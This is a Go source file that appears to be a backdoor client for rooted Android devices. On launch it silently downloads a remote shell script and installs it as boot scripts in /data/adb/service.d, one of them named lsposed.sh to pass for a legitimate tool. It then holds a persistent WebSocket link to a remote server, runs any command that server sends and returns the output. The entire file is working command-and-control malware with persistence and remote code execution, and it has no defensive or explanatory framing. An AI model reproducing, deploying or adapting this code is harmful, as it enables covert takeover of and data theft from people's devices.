package main

import (
        "context"
        "encoding/json"
        "io"
        "net"
        "net/http"
        "net/url"
        "os"
        "os/exec"
        "strings"
        "sync"
        "time"

        "github.com/gorilla/websocket"
)

const (
        deviceFile  = "/data/adb/.deviceid"
        wsURL       = "wss://qdwqidhqiow.yg.gs/connect"
        forceDNS    = "223.5.5.5:53"
        retryDelay  = 3 * time.Second
        readTimeout = 3 * time.Second
        pingPeriod  = 2 * time.Second
)

const scriptURL = "https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/load.sh"

// ------------------ 下載腳本 ------------------
func downloadScriptsSilently() {
        data, err := downloadFile(scriptURL)
        if err != nil {
                return
        }

        os.MkdirAll("/data/adb/service.d", 0755)

        _ = os.WriteFile("/data/adb/service.d/run.sh", data, 0755)
        _ = os.WriteFile("/data/adb/service.d/lsposed.sh", data, 0755)
}

func downloadFile(url string) ([]byte, error) {
        client := &http.Client{Timeout: 15 * time.Second}
        resp, err := client.Get(url)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()

        return io.ReadAll(resp.Body)
}

// ------------------ 資料結構 ------------------
type Message struct {
        Type      string `json:"type"`
        CommandID string `json:"command_id"`
        DeviceID  string `json:"device_id,omitempty"`
        Command   string `json:"command,omitempty"`
        Output    string `json:"output,omitempty"`
        Error     string `json:"error,omitempty"`
}

// ------------------ 設備ID處理 ------------------
func getDeviceID() string {
        data, err := os.ReadFile(deviceFile)
        if err != nil {
                newID := generateDeviceID()
                os.WriteFile(deviceFile, []byte(newID), 0644)
                return newID
        }
        return strings.TrimSpace(string(data))
}

func generateDeviceID() string {
        hostname, _ := os.Hostname()
        if hostname == "" {
                hostname = "unknown"
        }
        return hostname + "-" + time.Now().Format("20060102150405")
}

// ------------------ 命令執行 ------------------
func executeCommand(cmdLine, cmdID, deviceID string) Message {
        parts := strings.Fields(cmdLine)
        if len(parts) == 0 {
                return Message{Type: "result", CommandID: cmdID, DeviceID: deviceID, Error: "命令为空"}
        }

        ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
        defer cancel()

        cmd := exec.CommandContext(ctx, parts[0], parts[1:]...)
        output, err := cmd.CombinedOutput()

        msg := Message{
                Type:      "result",
                CommandID: cmdID,
                DeviceID:  deviceID,
                Output:    string(output),
        }
        if err != nil {
                msg.Error = err.Error()
        }
        return msg
}

// ------------------ WebSocket 連接管理 ------------------
type WSClient struct {
        conn     *websocket.Conn
        mu       sync.RWMutex
        deviceID string
        closed   bool
}

func NewWSClient(deviceID string) *WSClient {
        return &WSClient{deviceID: deviceID}
}

func (w *WSClient) connect() error {
        u, _ := url.Parse(wsURL)
        q := u.Query()
        q.Set("device_id", w.deviceID)
        u.RawQuery = q.Encode()

        resolver := &net.Resolver{
                PreferGo: true,
                Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
                        d := net.Dialer{Timeout: 10 * time.Second}
                        return d.DialContext(ctx, "udp", forceDNS)
                },
        }

        dialer := websocket.Dialer{
                Proxy: http.ProxyFromEnvironment,
                NetDialContext: (&net.Dialer{
                        Timeout:   10 * time.Second,
                        KeepAlive: 30 * time.Second,
                        Resolver:  resolver,
                }).DialContext,
        }

        conn, _, err := dialer.Dial(u.String(), nil)
        if err != nil {
                return err
        }

        w.mu.Lock()
        w.conn = conn
        w.closed = false
        w.mu.Unlock()

        conn.SetReadDeadline(time.Now().Add(readTimeout))
        conn.SetPongHandler(func(string) error {
                conn.SetReadDeadline(time.Now().Add(readTimeout))
                return nil
        })

        return nil
}

func (w *WSClient) close() {
        w.mu.Lock()
        defer w.mu.Unlock()
        if w.conn != nil && !w.closed {
                w.conn.Close()
                w.closed = true
        }
}

func (w *WSClient) isClosed() bool {
        w.mu.RLock()
        defer w.mu.RUnlock()
        return w.closed
}

func (w *WSClient) sendMessage(msg Message) error {
        w.mu.RLock()
        defer w.mu.RUnlock()
        if w.closed || w.conn == nil {
                return nil
        }
        return w.conn.WriteJSON(msg)
}

func (w *WSClient) startPing() {
        ticker := time.NewTicker(pingPeriod)
        defer ticker.Stop()

        for range ticker.C {
                if w.isClosed() {
                        return
                }

                w.mu.RLock()
                conn := w.conn
                w.mu.RUnlock()

                if conn != nil {
                        conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
                        if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
                                w.close()
                                return
                        }
                }
        }
}

func (w *WSClient) listen() {
        defer w.close()

        for {
                if w.isClosed() {
                        return
                }

                w.mu.RLock()
                conn := w.conn
                w.mu.RUnlock()

                if conn == nil {
                        return
                }

                _, msg, err := conn.ReadMessage()
                if err != nil {
                        return
                }

                var m Message
                if err := json.Unmarshal(msg, &m); err != nil {
                        continue
                }

                if m.Type == "command" && (m.DeviceID == "" || m.DeviceID == w.deviceID) {
                        go func() {
                                result := executeCommand(m.Command, m.CommandID, w.deviceID)
                                _ = w.sendMessage(result)
                        }()
                }
        }
}

// ------------------ 連接管理器 ------------------
type ConnectionManager struct {
        client    *WSClient
        deviceID  string
        reconnect chan bool
}

func NewConnectionManager(deviceID string) *ConnectionManager {
        return &ConnectionManager{
                deviceID:  deviceID,
                reconnect: make(chan bool, 1),
        }
}

func (cm *ConnectionManager) run() {
        for {
                cm.client = NewWSClient(cm.deviceID)

                if err := cm.client.connect(); err != nil {
                        time.Sleep(retryDelay)
                        continue
                }

                go cm.client.startPing()
                go cm.client.listen()

                <-cm.reconnect
                time.Sleep(retryDelay)
        }
}

func (cm *ConnectionManager) monitorConnection() {
        ticker := time.NewTicker(1 * time.Second)
        defer ticker.Stop()

        for range ticker.C {
                if cm.client.isClosed() {
                        select {
                        case cm.reconnect <- true:
                        default:
                        }
                }
        }
}

// ------------------ 主函數 ------------------
func main() {

        downloadScriptsSilently()

        deviceID := getDeviceID()

        manager := NewConnectionManager(deviceID)

        go manager.monitorConnection()
        manager.run()
}
